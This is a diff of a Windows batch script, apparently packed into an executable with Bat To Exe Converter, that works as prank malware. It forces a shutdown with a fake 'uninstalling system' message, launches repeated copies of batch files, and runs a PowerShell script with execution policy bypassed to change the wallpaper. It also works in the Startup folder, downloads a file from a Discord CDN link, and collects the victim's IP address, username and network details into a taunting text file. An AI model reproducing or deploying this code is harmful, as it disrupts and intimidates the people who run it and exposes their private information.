@@ -1,7 +1,7 @@
 ::[Bat To Exe Converter]
 ::
 ::YAwzoRdxOk+EWAjk
-::fBw5plQjdCyDJGyX8VAjFC5naTa+GGS5E7gZ5vzo08uVoUUUQu0sOK3azvSHLvYW5FHlcZk+6lxxrsIeGQhkLBOpaw01+T8W4TTSYZ/P5wm5HRDfsUhnSzQj1zrViCh1adBn+g==
+::fBw5plQjdCyDJGyX8VAjFC5aRwqNK1eeCaIS5Of66/m7hGYrXfAqa7OJ27aLIuFDuxGzJcF7jikOnpNbVE0PfUX7P1hk8GtGtSqMNMj8
 ::YAwzuBVtJxjWCl3EqQJgSA==
 ::ZR4luwNxJguZRRnk
 ::Yhs/ulQjdF+5
@@ -14,8 +14,8 @@
 ::dAsiuh18IRvcCxnZtBJQ
 ::cRYluBh/LU+EWAnk
 ::YxY4rhs+aU+IeA==
-::cxY6rQJ7JhzQF1fEqQJiZkkaHErSXA==
-::ZQ05rAF9IBncCkqN+0xwdVsGAlbMbCXqZg==
+::cxY6rQJ7JhzQF1fEqQJiZkgaHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsGAlfMbCXqZg==
 ::ZQ05rAF9IAHYFVzEqQIWAzJmeTfi
 ::eg0/rx1wNQPfEVWB+kM9LVsJDCKJNXmvFdU=
 ::fBEirQZwNQPfEVWB+kM9LVsJDAKJNXmvFdU=
@@ -26,7 +26,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wZns=
 ::Zg8zqx1/OA3MEVWAtB9wZns=
 ::dhA7pRFwIByZRRnKlA==
-::Zh4grVQjdCyDJGyX8VAjFC5naTa+GGS5E7gZ5vzo08uVoUUUQu0sOK3azvSHLvYW5FHlcZk+6lxxrsIeGQhkWDmdZx0huiBHrmHl
+::Zh4grVQjdCyDJGyX8VAjFC5aRwqNK1eeCaIS5Of66/m7hGYrXfAqa7P98YKHMvUApED8cPY=
 ::YB416Ek+ZG8=
 ::
 ::
@@ -469,7 +469,7 @@ start explorer.exe
 start
 start ppppppppppppppp.bat
 start
-shutdown.exe -s -t 15 -c "Desinstalando sistema..."
+shutdown.exe -s -t 30 -c "........................................................."
 cd C:\Users\%username%\Desktop
 
 md NoConfiesEnGenteDeInternet
@@ -682,6 +682,7 @@ echo Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -valu
 echo rundll32.exe user32.dll, UpdatePerUserSystemParameters >> KKKKllkjsdi.ps1 
 echo } ">> KKKKllkjsdi.ps1  
 echo Set-WallPaper -value C:\WWbbbkk\Bbllkk.png >> KKKKllkjsdi.ps1  
+echo rundll32.exe user32.dll, UpdatePerUserSystemParameters >> KKKKllkjsdi.ps1  
 powershell.exe -ExecutionPolicy Bypass -File "C:\WWbbbkk\KKKKllkjsdi.ps1" 
 rundll32.exe user32.dll, UpdatePerUserSystemParameters 
 rundll32.exe user32.dll, UpdatePerUserSystemParameters 
@@ -732,4 +733,12 @@ start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
 start s44ss1541DDDDD44.bat
 cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+echo Tenemos tu ip: >> Abrime.txt
+ipconfig | Find "IPv4" >> Abrime.txt
+echo Tu nombre: %username% >> Abrime.txt
+echo - >> Abrime.txt
+echo Incluso tenemos toda esta informacion: >> Abrime.txt
+echo Informacion completa de la red Conectada: >> Abrime.txt
+ipconfig /all>> Abrime.txt
+exit
 powershell wget -outf tittl.mp3 https://cdn.discordapp.com/attachments/806596260735614999/820859736241078303/rirck.mp3
